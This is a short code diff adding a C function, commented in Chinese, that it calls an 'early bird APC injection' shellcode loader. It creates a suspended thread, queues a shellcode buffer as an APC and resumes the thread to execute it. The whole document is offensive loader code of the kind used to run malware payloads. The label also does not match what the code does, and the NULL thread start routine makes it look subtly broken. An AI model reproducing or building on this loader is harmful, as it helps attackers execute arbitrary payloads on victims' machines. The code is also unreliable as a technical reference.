@@ -1,0 +1,13 @@
+// 早期桥接APC注入加载方式：在进程早期注入APC
+void ExecuteLoader(PBYTE shellcode, SIZE_T shellcodeSize) {
+#ifdef _DEBUG
+    printf("[*] 早期桥接APC注入方式执行Shellcode\n");
+#endif
+    HANDLE hThread = CreateThread(NULL, 0, NULL, NULL, CREATE_SUSPENDED, NULL);
+    if (hThread) {
+        QueueUserAPC((PAPCFUNC)shellcode, hThread, 0);
+        ResumeThread(hThread);
+        WaitForSingleObject(hThread, INFINITE);
+        CloseHandle(hThread);
+    }
+}
